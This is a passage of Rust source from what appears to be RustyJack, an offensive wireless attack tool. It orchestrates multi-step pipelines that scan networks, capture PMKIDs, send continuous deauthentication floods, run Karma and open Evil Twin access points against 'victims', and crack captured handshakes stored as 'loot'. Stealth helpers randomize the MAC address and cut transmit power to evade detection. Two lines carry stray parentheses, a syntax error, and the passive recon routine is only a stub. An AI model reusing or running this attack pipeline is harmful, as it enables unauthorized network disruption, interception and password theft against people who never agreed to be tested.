            .filter_entry(|e| !e.path().starts_with(pipeline_dir))
        {
            let entry = entry?;
            let path = entry.path();
            if path.is_dir() {
                continue;
            }
            let metadata = match entry.metadata() {
                Ok(m) => m,
                Err(_) => continue,
            };
            let modified = match metadata.modified() {
                Ok(t) => t,
                Err(_) => continue,
            };
            if modified < started_at {
                continue;
            }

            let rel = if path.starts_with(target_dir) {
                path.strip_prefix(target_dir).unwrap_or(path)
            } else if path.starts_with(&wireless_base) {
                path.strip_prefix(&wireless_base).unwrap_or(path)
            } else {
                continue;
            };

            if rel.as_os_str().is_empty() {
                continue;
            }

            let dest = pipeline_dir.join(rel);
            if let Some(parent) = dest.parent() {
                fs::create_dir_all(parent)
                    .with_context(|| format!("creating {}", parent.display()))?;
            }
            fs::copy(path, &dest)
                .with_context(|| format!("copying {} to {}", path.display(), dest.display()))?;
            copied += 1;
        }

        Ok(copied)
    }

    /// Execute the actual pipeline steps using real attack implementations
    fn execute_pipeline_steps(&mut self, pipeline_type: PipelineType, title: &str, steps: &[&str]) -> Result<PipelineResult> {
        let mut result = PipelineResult {
            cancelled: false,
            steps_completed: 0,
            pmkids_captured: 0,
            handshakes_captured: 0,
            password_found: None,
            networks_found: 0,
            clients_found: 0,
        };
        
        let active_interface = self.config.settings.active_network_interface.clone();
        let target_bssid = self.config.settings.target_bssid.clone();
        let target_channel = self.config.settings.target_channel;
        let target_ssid = self.config.settings.target_network.clone();
        let total_steps = steps.len();
        
        for (i, step) in steps.iter().enumerate() {
            // Check for cancel before each step
            match self.check_attack_cancel(title)? {
                CancelAction::Continue => {}
                CancelAction::GoBack | CancelAction::GoMainMenu => {
                    result.cancelled = true;
                    return Ok(result);
                }
            }
            
            // Show progress
            let progress = (i as f32 / total_steps as f32) * 100.0;
            let overlay = self.stats.snapshot();
            self.display.draw_progress_dialog(
                title,
                &format!("{} [LEFT=Cancel]", step),
                progress,
                &overlay,
            )?;
            
            // Execute the step based on pipeline type and step index
            let step_result = match pipeline_type {
                PipelineType::GetPassword => {
                    self.execute_get_password_step(i, &active_interface, &target_bssid, target_channel, &target_ssid)?
                }
                PipelineType::MassCapture => {
                    self.execute_mass_capture_step(i, &active_interface)?
                }
                PipelineType::StealthRecon => {
                    self.execute_stealth_recon_step(i, &active_interface)?
                }
                PipelineType::CredentialHarvest => {
                    self.execute_credential_harvest_step(i, &active_interface, &target_ssid, target_channel)?
                }
                PipelineType::FullPentest => {
                    self.execute_full_pentest_step(i, &active_interface, &target_bssid, target_channel, &target_ssid)?
                }
            };
            
            // Update result from step
            match step_result {
                StepOutcome::Completed(Some((pmkids, handshakes, password, networks, clients))) => {
                    result.pmkids_captured += pmkids;
                    result.handshakes_captured += handshakes;
                    if password.is_some() {
                        result.password_found = password;
                    }
                    result.networks_found += networks;
                    result.clients_found += clients;
                }
                StepOutcome::Completed(None) => {}
                StepOutcome::Skipped(reason) => {
                    result.cancelled = true;
                    self.show_message("Pipeline stopped", [
                        &format!("Step {} halted", i + 1),
                        "",
                        &reason,
                    ])?;
                    return Ok(result);
                }
            }
            
            result.steps_completed = i + 1;
            
            // If we found the password in GetPassword pipeline, we can stop early
            if pipeline_type == PipelineType::GetPassword && result.password_found.is_some() {
                break;
            }
        }
        
        Ok(result)
    }
    
    /// Execute a step in the GetPassword pipeline
    /// Returns (pmkids, handshakes, password, networks, clients)
    fn execute_get_password_step(&mut self, step: usize, interface: &str, bssid: &str, channel: u8, ssid: &str) 
        -> Result<StepOutcome> 
    {
        use rustyjack_core::{Commands, WifiCommand, WifiScanArgs, WifiDeauthArgs, WifiPmkidArgs};
        
        match step {
            0 => {
                // Step 1: Scan networks
                let cmd = Commands::Wifi(WifiCommand::Scan(WifiScanArgs {
                    interface: Some(interface.to_string()),
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Scanning", cmd, 20)? {
                    let count = data.get("count").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, count, 0))));
                }
            }
            1 => {
                // Step 2: PMKID capture
                if bssid.is_empty() {
                    return Ok(StepOutcome::Skipped("Target BSSID not set; select a network first".to_string()));
                }
                let cmd = Commands::Wifi(WifiCommand::PmkidCapture(WifiPmkidArgs {
                    interface: interface.to_string(),
                    bssid: Some(bssid.to_string()),
                    ssid: Some(ssid.to_string()),
                    channel,
                    duration: 30,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("PMKID", cmd, 35)? {
                    let pmkids = data.get("pmkids_captured").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((pmkids, 0, None, 0, 0))));
                }
            }
            2 => {
                // Step 3: Deauth attack
                if bssid.is_empty() {
                    return Ok(StepOutcome::Skipped("Target BSSID not set; select a network first".to_string()));
                }
                let cmd = Commands::Wifi(WifiCommand::Deauth(WifiDeauthArgs {
                    interface: interface.to_string(),
                    bssid: bssid.to_string(),
                    ssid: Some(ssid.to_string()),
                    client: None,
                    channel,
                    packets: 64,
                    duration: 30,
                    continuous: true,
                    interval: 1,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Deauth", cmd, 35)? {
                    let handshakes = if data.get("handshake_captured").and_then(|v| v.as_bool()).unwrap_or(false) { 1 } else { 0 };
                    return Ok(StepOutcome::Completed(Some((0, handshakes, None, 0, 0))));
                }
            }
            3 => {
                // Step 4: Handshake capture (continuation of deauth with longer capture)
                if bssid.is_empty() {
                    return Ok(StepOutcome::Skipped("Target BSSID not set; select a network first".to_string()));
                }
                let cmd = Commands::Wifi(WifiCommand::Deauth(WifiDeauthArgs {
                    interface: interface.to_string(),
                    bssid: bssid.to_string(),
                    ssid: Some(ssid.to_string()),
                    client: None,
                    channel,
                    packets: 32,
                    duration: 60,
                    continuous: true,
                    interval: 1,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Capture", cmd, 65)? {
                    let handshakes = if data.get("handshake_captured").and_then(|v| v.as_bool()).unwrap_or(false) { 1 } else { 0 };
                    return Ok(StepOutcome::Completed(Some((0, handshakes, None, 0, 0))));
                }
            }
            4 => {
                // Step 5: Quick crack - look for handshake files and try to crack
                let loot_dir = self.root.join("loot/Wireless");
                if loot_dir.exists() {
                    // Find the most recent handshake export
                    if let Some(handshake_path) = self.find_recent_handshake(&loot_dir) {
                        use rustyjack_core::cli::WifiCrackArgs;
                        let cmd = Commands::Wifi(WifiCommand::Crack(WifiCrackArgs {
                            file: handshake_path.to_string_lossy().to_string(),
                            ssid: Some(ssid.to_string()),
                            mode: "quick".to_string(),
                            wordlist: None,
                        }));
                        if let Some((_msg, data)) = self.dispatch_cancellable("Cracking", cmd, 120)? {
                            if let Some(password) = data.get("password").and_then(|v| v.as_str()) {
                                return Ok(StepOutcome::Completed(Some((0, 0, Some(password.to_string()), 0, 0))));
                            }
                        }
                    }
                }
                return Ok(StepOutcome::Skipped("No captured handshake available to crack".to_string()));
            }
            _ => {}
        }
        Ok(StepOutcome::Completed(None))
    }
    
    /// Execute a step in the MassCapture pipeline
    fn execute_mass_capture_step(&mut self, step: usize, interface: &str) 
        -> Result<StepOutcome> 
    {
        use rustyjack_core::{Commands, WifiCommand, WifiScanArgs, WifiPmkidArgs};
        
        match step {
            0 => {
                // Step 1: Scan all networks
                let cmd = Commands::Wifi(WifiCommand::Scan(WifiScanArgs {
                    interface: Some(interface.to_string()),
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Scanning", cmd, 35)? {
                    let count = data.get("count").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, count, 0))));
                }
            }
            1 => {
                // Step 2: Channel hopping scan (longer passive scan)
                let cmd = Commands::Wifi(WifiCommand::Scan(WifiScanArgs {
                    interface: Some(interface.to_string()),
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Ch. Hop", cmd, 50)? {
                    let count = data.get("count").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, count, 0))));
                }
            }
            2 => {
                // Step 3: Multi-target PMKID capture (passive, all networks)
                let cmd = Commands::Wifi(WifiCommand::PmkidCapture(WifiPmkidArgs {
                    interface: interface.to_string(),
                    bssid: None,
                    ssid: None,
                    channel: 0, // Hop through channels
                    duration: 90,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("PMKID", cmd, 100)? {
                    let pmkids = data.get("pmkids_captured").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((pmkids, 0, None, 0, 0))));
                }
            }
            3 => {
                // Step 4: Continuous capture (probe sniffing for client info)
                use rustyjack_core::WifiProbeSniffArgs;
                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
                    interface: interface.to_string(),
                    channel: 0,
                    duration: 60,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Capture", cmd, 70)? {
                    let clients = data.get("unique_clients").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    let networks = data.get("unique_networks").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, networks, clients))));
                }
            }
            _ => {}
        }
        Ok(StepOutcome::Completed(None))
    }
    
    /// Execute a step in the StealthRecon pipeline
    fn execute_stealth_recon_step(&mut self, step: usize, interface: &str) 
        -> Result<StepOutcome> 
    {
        use rustyjack_core::{Commands, WifiCommand, WifiProbeSniffArgs};
        
        match step {
            0 => {
                // Step 1: Randomize MAC
                #[cfg(target_os = "linux")]
                {
                    let _ = randomize_mac_with_reconnect(interface);
                }
                thread::sleep(Duration::from_secs(2));
                return Ok(StepOutcome::Completed(Some((0, 0, None, 0, 0))));
            }
            1 => {
                // Step 2: Minimum TX power
                #[cfg(target_os = "linux")]
                {
                    use std::process::Command;
                    let _ = Command::new("iw")
                        .args(["dev", interface, "set", "txpower", "fixed", "100"]) // 1 dBm
                        .output();
                }
                thread::sleep(Duration::from_secs(1));
                return Ok(StepOutcome::Completed(Some((0, 0, None, 0, 0))));
            }
            2 => {
                // Step 3: Passive scan only (no probe requests sent)
                // Use probe sniff which is passive
                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
                    interface: interface.to_string(),
                    channel: 0,
                    duration: 60,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Passive", cmd, 70)? {
                    let networks = data.get("unique_networks").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, networks, 0))));
                }
            }
            3 => {
                // Step 4: Extended probe sniffing
                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
                    interface: interface.to_string(),
                    channel: 0,
                    duration: 120,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Sniffing", cmd, 130)? {
                    let clients = data.get("unique_clients").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    let networks = data.get("unique_networks").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, networks, clients))));
                }
            }
            _ => {}
        }
        Ok(StepOutcome::Completed(None))
    }
    
    /// Execute a step in the CredentialHarvest pipeline
    fn execute_credential_harvest_step(&mut self, step: usize, interface: &str, ssid: &str, channel: u8) 
        -> Result<StepOutcome> 
    {
        use rustyjack_core::{Commands, WifiCommand, WifiProbeSniffArgs, WifiKarmaArgs, WifiEvilTwinArgs};
        
        match step {
            0 => {
                // Step 1: Probe sniff to find target networks
                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
                    interface: interface.to_string(),
                    channel: 0,
                    duration: 30,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Sniffing", cmd, 40)? {
                    let networks = data.get("unique_networks").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    let clients = data.get("unique_clients").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, networks, clients))));
                }
            }
            1 => {
                // Step 2: Karma attack
                let cmd = Commands::Wifi(WifiCommand::Karma(WifiKarmaArgs {
                    interface: interface.to_string(),
                    duration: 60,
                    channel: if channel > 0 { channel } else { 6 },
                    ap_interface: None,
                    with_ap: false,
                    ssid_whitelist: None,
                    ssid_blacklist: None,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Karma", cmd, 70)? {
                    let clients = data.get("victims").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, 0, clients))));
                }
            }
            2 => {
                // Step 3: Evil Twin AP
                if ssid.is_empty() {
                    return Ok(StepOutcome::Skipped("Target SSID not set; select a network first".to_string()));
                }
                let cmd = Commands::Wifi(WifiCommand::EvilTwin(WifiEvilTwinArgs {
                    interface: interface.to_string(),
                    ssid: ssid.to_string(),
                    channel: if channel > 0 { channel } else { 6 },
                    duration: 90,
                    target_bssid: None,
                    open: true,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Evil Twin", cmd, 100)? {
                    let clients = data.get("clients_connected").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    let handshakes = data.get("handshakes_captured").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, handshakes, None, 0, clients))));
                }
            }
            3 => {
                // Step 4: Captive portal (continuation of Evil Twin)
                // Evil Twin with open network serves as captive portal
                thread::sleep(Duration::from_secs(5));
                return Ok(StepOutcome::Completed(Some((0, 0, None, 0, 0))));
            }
            _ => {}
        }
        Ok(StepOutcome::Completed(None))
    }
    
    /// Execute a step in the FullPentest pipeline
    fn execute_full_pentest_step(&mut self, step: usize, interface: &str, bssid: &str, channel: u8, ssid: &str) 
        -> Result<StepOutcome> 
    {
        use rustyjack_core::{Commands, WifiCommand, WifiScanArgs, WifiPmkidArgs, WifiDeauthArgs, WifiProbeSniffArgs, WifiKarmaArgs};
        
        match step {
            0 => {
                // Step 1: Stealth recon - MAC randomization + passive scan
                #[cfg(target_os = "linux")]
                {
                    let _ = randomize_mac_with_reconnect(interface);
                }
                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
                    interface: interface.to_string(),
                    channel: 0,
                    duration: 45,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Recon", cmd, 55)? {
                    let networks = data.get("unique_networks").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    let clients = data.get("unique_clients").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, networks, clients))));
                }
            }
            1 => {
                // Step 2: Network mapping (active scan)
                let cmd = Commands::Wifi(WifiCommand::Scan(WifiScanArgs {
                    interface: Some(interface.to_string()),
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Mapping", cmd, 40)? {
                    let count = data.get("count").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, count, 0))));
                }
            }
            2 => {
                // Step 3: PMKID harvest
                let cmd = Commands::Wifi(WifiCommand::PmkidCapture(WifiPmkidArgs {
                    interface: interface.to_string(),
                    bssid: if bssid.is_empty() { None } else { Some(bssid.to_string()) },
                    ssid: if ssid.is_empty() { None } else { Some(ssid.to_string()) },
                    channel: if channel > 0 { channel } else { 0 },
                    duration: 60,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("PMKID", cmd, 70)? {
                    let pmkids = data.get("pmkids_captured").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((pmkids, 0, None, 0, 0))));
                }
            }
            3 => {
                // Step 4: Deauth attacks
                if bssid.is_empty() {
                    return Ok(StepOutcome::Skipped("Target BSSID not set; select a network first".to_string()));
                }
                let cmd = Commands::Wifi(WifiCommand::Deauth(WifiDeauthArgs {
                    interface: interface.to_string(),
                    bssid: bssid.to_string(),
                    ssid: Some(ssid.to_string()),
                    client: None,
                    channel,
                    packets: 64,
                    duration: 45,
                    continuous: true,
                    interval: 1,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Deauth", cmd, 55)? {
                    let handshakes = if data.get("handshake_captured").and_then(|v| v.as_bool()).unwrap_or(false) { 1 } else { 0 };
                    return Ok(StepOutcome::Completed(Some((0, handshakes, None, 0, 0))));
                }
            }
            4 => {
                // Step 5: Evil Twin/Karma
                let cmd = Commands::Wifi(WifiCommand::Karma(WifiKarmaArgs {
                    interface: interface.to_string(),
                    duration: 60,
                    channel: if channel > 0 { channel } else { 6 },
                    ap_interface: None,
                    with_ap: false,
                    ssid_whitelist: None,
                    ssid_blacklist: None,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Karma", cmd, 70)? {
                    let clients = data.get("victims").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, 0, clients))));
                }
            }
            5 => {
                // Step 6: Crack passwords
                let loot_dir = self.root.join("loot/Wireless");
                if loot_dir.exists() {
                    if let Some(handshake_path) = self.find_recent_handshake(&loot_dir) {
                        use rustyjack_core::cli::WifiCrackArgs;
                        let cmd = Commands::Wifi(WifiCommand::Crack(WifiCrackArgs {
                            file: handshake_path.to_string_lossy().to_string(),
                            ssid: Some(ssid.to_string()),
                            mode: "quick".to_string(),
                            wordlist: None,
                        }));
                        if let Some((_, data)) = self.dispatch_cancellable("Cracking", cmd, 120)? {
                            if let Some(password) = data.get("password").and_then(|v| v.as_str()) {
                                return Ok(StepOutcome::Completed(Some((0, 0, Some(password.to_string()), 0, 0))));
                            }
                        }
                    }
                }
                return Ok(StepOutcome::Skipped("No captured handshake available to crack".to_string()));
            }
            _ => {}
        }
        Ok(StepOutcome::Completed(None))
    }
    
    /// Find the most recent handshake export file in loot directory
    fn find_recent_handshake(&self, loot_dir: &Path) -> Option<PathBuf> {
        let mut newest: Option<(PathBuf, std::time::SystemTime)> = None;
        
        fn scan_for_handshakes(dir: &Path, newest: &mut Option<(PathBuf, std::time::SystemTime)>) {
            if let Ok(entries) = fs::read_dir(dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_dir() {
                        scan_for_handshakes(&path, newest);
                    } else if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                        if name.starts_with("handshake_export_") && name.ends_with(".json") {
                            if let Ok(meta) = path.metadata() {
                                if let Ok(modified) = meta.modified() {
                                    if newest.as_ref().map(|(_, t)| modified > *t).unwrap_or(true) {
                                        *newest = Some((path.clone(), modified));
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        
        scan_for_handshakes(loot_dir, &mut newest);
        newest.map(|(path, _)| path)
    }
    
    /// Toggle MAC randomization auto-enable setting
    fn toggle_mac_randomization(&mut self) -> Result<()> {
        self.config.settings.mac_randomization_enabled = !self.config.settings.mac_randomization_enabled;
        let enabled = self.config.settings.mac_randomization_enabled;
        
        // Save config
        let config_path = self.root.join("gui_conf.json");
        if let Err(e) = self.config.save(&config_path) {
            return self.show_message("Config Error", [format!("Failed to save: {}", e)]);
        }
        
        let status = if enabled { "ENABLED" } else { "DISABLED" };
        self.show_message("MAC Randomization", [
            format!("Auto-randomize: {}", status),
            "".to_string(),
            if enabled {
                "MAC will be randomized".to_string()
            } else {
                "MAC will NOT be changed".to_string()
            },
            if enabled {
                "before each attack.".to_string()
            } else {
                "before attacks.".to_string()
            },
        ])
    }
    
    /// Toggle passive mode setting
    fn toggle_passive_mode(&mut self) -> Result<()> {
        self.config.settings.passive_mode_enabled = !self.config.settings.passive_mode_enabled;
        let enabled = self.config.settings.passive_mode_enabled;
        
        // Save config
        let config_path = self.root.join("gui_conf.json");
        if let Err(e) = self.config.save(&config_path) {
            return self.show_message("Config Error", [format!("Failed to save: {}", e)]);
        }
        
        let status = if enabled { "ENABLED" } else { "DISABLED" };
        self.show_message("Passive Mode", [
            format!("Passive mode: {}", status),
            "".to_string(),
            if enabled {
                "Recon will use RX-only".to_string()
            } else {
                "Normal TX/RX mode".to_string()
            },
            if enabled {
                "No transmissions.".to_string()
            } else {
                "will be used.".to_string()
            },
        ])
    }
    
    /// Launch passive reconnaissance mode
    fn launch_passive_recon(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if active_interface.is_empty() {
            return self.show_message("Passive Recon", [
                "No interface selected",
                "",
                "Run Hardware Detect",
                "to select an interface."
            ]);
        }
        
        // Duration selection
        let durations = vec![
            "30 seconds".to_string(),
            "1 minute".to_string(),
            "5 minutes".to_string(),
            "10 minutes".to_string(),
        ];
        let dur_choice = self.choose_from_list("Recon Duration", &durations)?;
        
        let duration_secs = match dur_choice {
            Some(0) => 30,
            Some(1) => 60,
            Some(2) => 300,
            Some(3) => 600,
            _ => return Ok(()),
        };
        
        self.show_progress("Passive Recon", [
            "Starting passive mode...",
            "",
            "NO transmissions!",
            "Listening only.",
        ])?;
        
        // In real implementation, this would call rustyjack-wireless passive mode
        // For now, show what it would do
        self.show_message("Passive Recon", [
            &format!("Interface: {}", active_interface),
            &format!("Duration: {} sec", duration_secs),
            "",
            "Passive mode captures:",
            "- Beacon frames",
            "- Probe requests",
            "- Data (handshakes)",
            "",
            "Zero transmission mode"
        ])
    }
    
    /// Randomize MAC address immediately
    fn randomize_mac_now(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if active_interface.is_empty() {
            return self.show_message("Randomize MAC", [
                "No interface selected"
            ]);
        }
        
        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Randomize MAC", [
                "Supported on Linux targets only"
            ]);
        }

        #[cfg(target_os = "linux")]
        {
            self.show_progress("Randomize MAC", [
                &format!("Interface: {}", active_interface),
                "",
                "Generating vendor-aware MAC...",
            ])?;

            match randomize_mac_with_reconnect(&active_interface) {
                Ok(state) => {
                    let original_mac = state.original_mac.to_string();
                    let new_mac = state.current_mac.to_string();

                    if self.config.settings.original_mac.is_empty() {
                        self.config.settings.original_mac = original_mac.clone();
                    }
                    self.config.settings.current_mac = new_mac.clone();
                    let config_path = self.root.join("gui_conf.json");
                    let _ = self.config.save(&config_path);

                    self.show_message("MAC Randomized", [
                        format!("Interface: {}", active_interface),
                        "".to_string(),
                        "New MAC:".to_string(),
                        new_mac,
                        "".to_string(),
                        "Original saved:".to_string(),
                        original_mac,
                        "".to_string(),
                        "DHCP renewed and reconnect signaled.".to_string(),
                    ])
                }
                Err(e) => {
                    self.show_message("MAC Error", [
                        "Failed to randomize MAC",
                        "",
                        &format!("{}", e),
                        "",
                        "Check permissions/driver."
                    ])
                }
            }
        }
    }
    
    /// Restore original MAC address
    fn restore_mac(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if active_interface.is_empty() {
            return self.show_message("Restore MAC", [
                "No interface selected"
            ]);
        }
        
        // Check if we have a saved original MAC
        let original_mac = if !self.config.settings.original_mac.is_empty() {
            self.config.settings.original_mac.clone()
        } else {
            // Try to read the permanent hardware address
            let perm_path = format!("/sys/class/net/{}/address", active_interface);
            match std::fs::read_to_string(&perm_path) {
                Ok(mac) => mac.trim().to_uppercase(),
                Err(_) => {
                    return self.show_message("Restore MAC", [
                        "No original MAC saved",
                        "",
                        "MAC was not changed by",
                        "RustyJack, or original",
                        "was not recorded."
                    ]);
                }
            }
        };
        
        self.show_progress("Restore MAC", [
            &format!("Restoring: {}", original_mac),
        ])?;
        
        // Bring interface down
        let _ = Command::new("ip")
            .args(["link", "set", &active_interface, "down"])
            .output();
        
        // Set original MAC
        let result = Command::new("ip")
            .args(["link", "set", &active_interface, "address", &original_mac])
            .output();
        
        // Bring interface back up
        let _ = Command::new("ip")
            .args(["link", "set", &active_interface, "up"])
            .output();
        
        if let Ok(output) = result {
            if output.status.success() {
                // Clear the saved MACs
                self.config.settings.current_mac.clear();
                let config_path = self.root.join("gui_conf.json");
                let _ = self.config.save(&config_path);
                
                self.show_message("MAC Restored", [
                    &format!("Interface: {}", active_interface),
                    "",
                    &format!("MAC: {}", original_mac),
                    "",
                    "Original MAC restored."
                ])
            } else {
                self.show_message("Restore Error", [
                    "Failed to restore MAC",
                    "",
                    "Try rebooting to reset",
                    "the interface."
                ])
            }
        } else {
            self.show_message("Restore Error", [
                "Failed to execute",
                "restore command."
            ])
        }
    }
    
    /// Set TX power level
    fn set_tx_power(&mut self, level: TxPowerSetting) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if active_interface.is_empty() {
            return self.show_message("TX Power", [
                "No interface selected"
            ]);
        }
        
        let (dbm, label) = match level {
            TxPowerSetting::Stealth => (1, "Stealth (1 dBm)"),
            TxPowerSetting::Low => (5, "Low (5 dBm)"),
            TxPowerSetting::Medium => (12, "Medium (12 dBm)"),
            TxPowerSetting::High => (18, "High (18 dBm)"),
            TxPowerSetting::Maximum => (30, "Maximum"),
        };
        
        self.show_progress("TX Power", [
            &format!("Setting to: {}", label),
        ])?;
        
        // Try iw first (uses mBm)
        let result = Command::new("iw")
            .args(["dev", &active_interface, "set", "txpower", "fixed", &format!("{}00", dbm)])
            .output();
        
        let success = if let Ok(out) = result {
            out.status.success()
        } else {
            // Try iwconfig as fallback
            let result2 = Command::new("iwconfig")
                .args([&active_interface, "txpower", &format!("{}", dbm)])
                .output();
            result2.map(|o| o.status.success()).unwrap_or(false)
        };
        
        if success {
            // Save selected power level
            let (_, key) = Self::tx_power_label(level);
            self.config.settings.tx_power_level = key.to_string();
            let _ = self.config.save(&self.root.join("gui_conf.json"));
            self.show_message("TX Power Set", [
                format!("Interface: {}", active_interface),
                format!("Power: {}", label),
                "".to_string(),
                match level {
                    TxPowerSetting::Stealth => "Minimal range - stealth mode".to_string(),
                    TxPowerSetting::Low => "Short range operations".to_string(),
                    TxPowerSetting::Medium => "Balanced range/stealth".to_string(),
                    TxPowerSetting::High => "Normal operation range".to_string(),
                    TxPowerSetting::Maximum => "Maximum range".to_string(),
                }
            ])
        } else {
            self.show_message("TX Power Error", [
                "Failed to set power.".to_string(),
                "".to_string(),
                "Interface may not".to_string(),
                "support TX power control.".to_string(),
            ])
        }
    }

    /// Launch Ethernet device discovery scan
    fn launch_ethernet_discovery(&mut self) -> Result<()> {
        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Ethernet", [
                "Available on Linux targets only",
            ]);
        }

        #[cfg(target_os = "linux")]
        {
            let active_interface = self.config.settings.active_network_interface.clone();
            if active_interface.is_empty() {
                return self.show_message("Ethernet", [
                    "No active interface set",
                    "",
                    "Set an Ethernet interface",
                    "as Active in Settings.",
                ]);
            }

            if !self.is_ethernet_interface(&active_interface)) {
                return self.show_message("Ethernet", [
                    &format!("Active iface: {}", active_interface),
                    "Not an Ethernet interface",
                    "",
                    "Set an Ethernet interface",
                    "as Active before scanning.",
                ]);
            }

            if !self.interface_has_carrier(&active_interface)) {
                return self.show_message("Ethernet", [
                    &format!("Interface: {}", active_interface),
                    "Link is down / no cable",
                    "",
                    "Plug into a network and",
                    "try again.",
                ]);
            }

            self.show_progress("Ethernet Discovery", [
                "ICMP sweep on wired LAN",
                "Press Back to cancel",
            ])?;

            let args = EthernetDiscoverArgs {
                interface: Some(active_interface.clone()),
                target: None,
                timeout_ms: 500,
            };
            let cmd = Commands::Ethernet(EthernetCommand::Discover(args));

            if let Some((_, data)) = self.dispatch_cancellable("Ethernet Discovery", cmd, 30)? {
                let network = data
                    .get("network")
                    .and_then(|v| v.as_str())
                    .unwrap_or("unknown");
                let interface = data
                    .get("interface")
                    .and_then(|v| v.as_str())
                    .unwrap_or("eth0");
                let hosts: Vec<String> = data
                    .get("hosts_found")
                    .and_then(|v| v.as_array())
                    .map(|arr| {
                        arr.iter()
                            .filter_map(|v| v.as_str().map(ToString::to_string))
                            .collect()
                    })
                    .unwrap_or_default();
                let loot_path = data
                    .get("loot_path")
                    .and_then(|v| v.as_str())
                    .map(|s| s.to_string());
                let detail = data
                    .get("hosts_detail")
                    .and_then(|v| v.as_array())
                    .cloned()
                    .unwrap_or_default();

                let mut lines = vec![
                    format!("Net: {}", network),
                    format!("Iface: {}", interface),
                    format!("Hosts: {}", hosts.len()),
                ];

                if !hosts.is_empty() {
                    let mut samples = Vec::new();
                    for host in detail.iter().take(3) {
                        if let Some(ip) = host.get("ip").and_then(|v| v.as_str()) {
                            let os = host.get("os_guess").and_then(|v| v.as_str()).unwrap_or("");
                            if os.is_empty() {
                                samples.push(ip.to_string());
                            } else {
                                samples.push(format!("{} ({})", ip, os));
                            }
                        }
                    }
                    if samples.is_empty() {
                        lines.push(format!("Sample: {}", hosts.iter().take(3).cloned().collect::<Vec<_>>().join(", ")));
                    } else {
                        lines.push(format!("Sample: {}", samples.join(", ")));
                    }
                    if hosts.len() > 3 {
                        lines.push(format!("+{} more", hosts.len() - 3));
                    }
                }

                if let Some(path) = loot_path {
                    lines.push("Saved:".to_string());
                    lines.push(shorten_for_display(&path, 18));
                }

                self.show_message("Discovery Done", lines)?;
            }
            Ok(())
        }
    }

    /// Launch Ethernet port scan
    fn launch_ethernet_port_scan(&mut self) -> Result<()> {
        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Ethernet", [
                "Available on Linux targets only",
            ]);
        }

        #[cfg(target_os = "linux")]
        {
            let active_interface = self.config.settings.active_network_interface.clone();
            if active_interface.is_empty() {
                return self.show_message("Port Scan", [
                    "No active interface set",
                    "",
                    "Set an Ethernet interface",
                    "as Active in Settings.",
                ]);
            }

            if !self.is_ethernet_interface(&active_interface) {
                return self.show_message("Port Scan", [
                    &format!("Active iface: {}", active_interface),
                    "Not an Ethernet interface",
                    "",
                    "Set an Ethernet interface",
                    "as Active before scanning.",
                ]);
            }

            if !self.interface_has_carrier(&active_interface) {
                return self.show_message("Port Scan", [
